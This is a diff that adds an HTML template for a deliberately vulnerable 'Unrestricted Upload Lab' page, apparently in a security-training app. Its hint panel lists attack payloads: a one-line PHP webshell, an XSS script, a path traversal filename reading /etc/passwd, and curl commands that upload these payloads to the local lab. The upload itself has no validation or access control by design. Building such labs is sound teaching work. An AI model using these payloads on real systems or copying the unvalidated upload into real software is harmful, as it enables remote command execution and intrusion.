@@ -1,0 +1,72 @@
+{% extends "base.html" %}
+{% block title %}File Upload{% endblock %}
+
+{% block content %}
+<div class="page-header">
+  <h1>📁 File Upload — Unrestricted Upload Lab</h1>
+  <p>No file type validation · No size limits · Original filenames preserved</p>
+</div>
+
+<div class="two-col">
+  <div class="card animate-in">
+    <div class="card-title">⬆️ Upload a File</div>
+
+    {% if message %}
+    <div class="alert alert-{{ 'success' if msg_type == 'success' else 'error' }}">
+      {{ '✅' if msg_type == 'success' else '❌' }} {{ message }}
+    </div>
+    {% endif %}
+
+    <form method="POST" action="/upload" enctype="multipart/form-data">
+      <div class="form-group">
+        <label for="file">Choose File</label>
+        <input type="file" id="file" name="file">
+      </div>
+      <button type="submit" class="btn btn-primary" style="width:100%">📤 Upload</button>
+    </form>
+
+    {% if files %}
+    <div style="margin-top:1.5rem;">
+      <div class="card-title" style="font-size:.9rem;">📂 Uploaded Files</div>
+      <div class="table-wrap" style="margin-top:.5rem;">
+        <table>
+          <thead><tr><th>Filename</th><th>Size</th><th>Action</th></tr></thead>
+          <tbody>
+            {% for f in files %}
+            <tr>
+              <td><span class="file-name">{{ f.name }}</span></td>
+              <td><span class="file-size">{{ f.size }} bytes</span></td>
+              <td><a href="/uploads/{{ f.name }}" class="btn btn-secondary" style="padding:.3rem .6rem; font-size:.75rem;">View</a></td>
+            </tr>
+            {% endfor %}
+          </tbody>
+        </table>
+      </div>
+    </div>
+    {% endif %}
+  </div>
+
+  <div class="card animate-in">
+    <div class="card-title">💡 Upload Testing</div>
+    <div class="hint-box" style="margin-top:0; border:none; background:transparent; padding:0;">
+      <h4>Malicious Uploads</h4>
+      <ul>
+        <li>PHP webshell: <code>&lt;?php system($_GET['cmd']); ?&gt;</code></li>
+        <li>HTML file with XSS: <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code></li>
+        <li>.htaccess manipulation</li>
+        <li>Filename with path traversal: <code>../../etc/passwd</code></li>
+      </ul>
+      <h4 style="margin-top:1rem;">Via curl</h4>
+      <ul>
+        <li><code>curl -F "file=@malicious.php" http://localhost:9090/upload</code></li>
+        <li><code>echo '&lt;script&gt;alert(1)&lt;/script&gt;' > xss.html && curl -F "file=@xss.html" http://localhost:9090/upload</code></li>
+      </ul>
+      <h4 style="margin-top:1rem;">Access Uploaded Files</h4>
+      <ul>
+        <li>Direct URL: <code>http://localhost:9090/uploads/FILENAME</code></li>
+        <li>No access control — all uploads are publicly accessible</li>
+      </ul>
+    </div>
+  </div>
+</div>
+{% endblock %}
